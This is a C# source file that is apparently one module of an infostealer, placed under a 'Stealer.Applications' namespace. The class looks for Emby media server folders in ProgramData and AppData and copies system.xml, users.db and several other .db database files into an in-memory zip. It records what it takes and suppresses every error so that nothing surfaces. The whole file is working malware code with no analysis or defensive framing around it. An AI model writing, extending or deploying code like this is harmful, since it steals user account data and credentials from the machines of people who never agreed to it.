using IntelXPro.src.IntelXPro.Dependencies.Data;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace IntelXPro.src.IntelXPro.Stealer.Applications
{
    internal class Emby : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            string programDataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "Emby-Server");
            string appDataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Emby-Server");

            Counter.CounterApplications counterApplications = new Counter.CounterApplications();
            counterApplications.Name = "Emby";

            bool foundData = false;

            if (Directory.Exists(programDataPath))
            {
                foundData |= CollectFromDirectory(programDataPath, "ProgramData", zip, counterApplications);
            }

            if (Directory.Exists(appDataPath))
            {
                foundData |= CollectFromDirectory(appDataPath, "AppData", zip, counterApplications);
            }

            if (foundData && counterApplications.Files.Count > 0)
            {
                counter.Applications.Add(counterApplications);
            }
        }

        private bool CollectFromDirectory(string basePath, string location, InMemoryZip zip, Counter.CounterApplications counterApplications)
        {
            bool foundData = false;

            try
            {
                string configPath = Path.Combine(basePath, "config");
                if (Directory.Exists(configPath))
                {
                    string[] configFiles = new string[]
                    {
                        "system.xml",
                        "users.db"
                    };

                    foreach (string configFile in configFiles)
                    {
                        string fullPath = Path.Combine(configPath, configFile);
                        if (File.Exists(fullPath))
                        {
                            string zipPath = $"Applications\\Emby\\{location}\\config\\{configFile}";
                            zip.AddFile(zipPath, File.ReadAllBytes(fullPath));
                            counterApplications.Files.Add(fullPath + " => " + zipPath);
                            foundData = true;
                        }
                    }
                }

                string dataPath = Path.Combine(basePath, "data");
                if (Directory.Exists(dataPath))
                {
                    string[] dbFiles = Directory.GetFiles(dataPath, "*.db", SearchOption.TopDirectoryOnly);
                    
                    foreach (string file in dbFiles.Take(5))
                    {
                        string fileName = Path.GetFileName(file);
                        string zipPath = $"Applications\\Emby\\{location}\\data\\{fileName}";
                        zip.AddFile(zipPath, File.ReadAllBytes(file));
                        counterApplications.Files.Add(file + " => " + zipPath);
                        foundData = true;
                    }
                }
            }
            catch
            {
            }

            return foundData;
        }
    }
}
